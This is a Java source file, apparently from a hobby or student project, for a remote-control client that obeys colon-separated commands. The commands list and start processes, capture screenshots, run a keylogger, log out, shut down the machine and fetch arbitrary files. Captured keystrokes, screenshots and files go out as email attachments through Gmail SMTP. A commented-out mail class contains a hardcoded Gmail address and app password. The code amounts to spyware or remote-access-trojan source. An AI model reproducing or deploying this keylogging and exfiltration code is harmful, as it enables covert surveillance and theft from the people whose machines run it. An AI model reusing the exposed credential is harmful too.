package IGNORE;

import java.io.File;

// import java.util.Properties;
// import javax.mail.Authenticator;
// import javax.mail.Message;
// import javax.mail.MessagingException;
// import javax.mail.Multipart;
// import javax.mail.PasswordAuthentication;
// import javax.mail.Session;
// import javax.mail.Transport;
// import javax.mail.internet.InternetAddress;
// import javax.mail.internet.MimeBodyPart;
// import javax.mail.internet.MimeMessage;
// import javax.mail.internet.MimeMultipart;

// class SendMail {

//   Message message;
//   Session session;

//   public SendMail(String to) {
//     Properties properties = new Properties();
//     properties.put("mail.smtp.host", "smtp.gmail.com");
//     properties.put("mail.smtp.port", "587");
//     properties.put("mail.smtp.auth", "true");
//     properties.put("mail.smtp.starttls.enable", "true");

//     this.session =
//       Session.getDefaultInstance(
//         properties,
//         new Authenticator() {
//           protected PasswordAuthentication getPasswordAuthentication() {
//             return new PasswordAuthentication(
//               "dotu10257@gmail.com",
//               "zhylipsbmyvwzrkg"
//             );
//           }
//         }
//       );

//     try {
//       this.message = new MimeMessage(this.session);

//       this.message.setFrom(new InternetAddress("dotu10257@gmail.com"));

//       this.message.setRecipient(
//           Message.RecipientType.TO,
//           new InternetAddress(to)
//         );
//     } catch (MessagingException e) {
//       e.printStackTrace();
//     }
//   }

//   public void sendSubject(String subject) {
//     try {
//       this.message.setSubject(subject);
//       Transport.send(message);
//       System.out.println("Send mail file success!");
//     } catch (MessagingException e) {
//       e.printStackTrace();
//     }
//   }

//   public void sendFile(String path) {
//     try {
//       this.message.setSubject("Response remote file");
//       MimeBodyPart filePart = new MimeBodyPart();
//       filePart.attachFile(path);
//       Multipart multipart = new MimeMultipart();
//       multipart.addBodyPart(filePart);
//       this.message.setContent(multipart);
//       Transport.send(message);
//       System.out.println("Send mail file success!");
//     } catch (Exception e) {
//       e.printStackTrace();
//     }
//   }

//   public static void main(String[] args) {
//     SendMail send = new SendMail("dotu30257@gmail.com");
//     send.sendFile("name1.png");
//   }
// }

public class RemotePC {

  String[] message;
  KeyLog keylog;
  SendMail send;

  public RemotePC(String message, KeyLog keylog, SendMail send) {
    this.message = message.split(":");
    this.keylog = keylog;
    this.send = send;
  }

  public void deleteFile(String path) {
    String filePath = path;

    File file = new File(filePath);

    if (file.exists()) {
      if (file.delete()) {
        System.out.println("Xóa tệp thành công.");
      } else {
        System.out.println("Không thể xóa tệp.");
      }
    } else {
      System.out.println("Tệp không tồn tại.");
    }
  }

  public void run() {
    ProcessPC process = new ProcessPC();

    switch (message[0]) {
      case "process":
        if (message[1].equals("list")) {
          process.listProcess();
          send.sendFile("process.txt");
          System.out.println("list process");
        }
        if (message[1].equals("start")) {
          System.out.println("starting process" + message[2]);
          process.startProcess(message[2]);
        }
        if (message[1].equals("stop")) {
          System.out.println("stop process PID" + message[2]);
        }
        break;
      case "screenshot":
        System.out.println(message[1]);
        ScreenShot screen = new ScreenShot(message[1]);
        System.out.println("screenshot suscessfull");

        send.sendFile(message[1]);
        System.out.println("Send  suscessfull");
        deleteFile(message[1]);

        break;
      case "keylog":
        if (message[1].equals("start")) {
          if (this.keylog.isLogging == false) {
            this.keylog.start();
            System.out.println("start keylog");
          } else {
            System.out.println("keylog is running");
          }
        }
        if (message[1].equals("stop")) {
          if (this.keylog.isLogging == true) {
            this.keylog.isLogging = false;
            this.keylog.stop();
            send.sendFile("keylog.txt");
            deleteFile("keylog.txt");
            System.out.println("stop keylog");
          } else {
            System.out.println("keylog is not running");
          }
        }
        break;
      case "logout":
        process.logout();
        System.out.println("logout suscessfull");
        break;
      case "shutdown":
        process.shutdown();
        System.out.println("shutdown suscessfull");
        break;
      case "getfile":
        send.sendFile(message[1]);
        System.out.println("get file suscessfull");
        break;
      default:
        System.out.println("command not found");
        break;
    }
  }
}
